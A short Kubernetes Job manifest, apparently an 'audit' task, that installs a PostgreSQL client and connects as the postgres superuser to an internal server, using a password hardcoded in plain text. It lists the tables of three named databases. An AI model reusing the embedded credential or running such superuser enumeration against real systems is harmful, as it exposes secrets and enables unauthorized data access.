apiVersion: batch/v1
kind: Job
metadata:
  name: dune-db-v3
  namespace: default
spec:
  ttlSecondsAfterFinished: 600
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: alpine/curl:latest
        command: ["/bin/sh","-c"]
        args:
        - |
          apk add -q postgresql-client
          export PGPASSWORD=wpEJl3WKOImARD9WgBsa
          PG="psql -h 172.16.10.14 -p 6432 -U postgres"
          
          echo "=TACHYUS_TABLES="
          $PG -d tachyus.com_db -c "\dt"
          echo "=END="
          
          echo "=TACHCORP_TABLES="
          $PG -d tachcorp_db -c "\dt"
          echo "=END_TC="
          
          echo "=CONTRACT_TABLES="
          $PG -d contract_db -c "\dt"
          echo "=END_CT="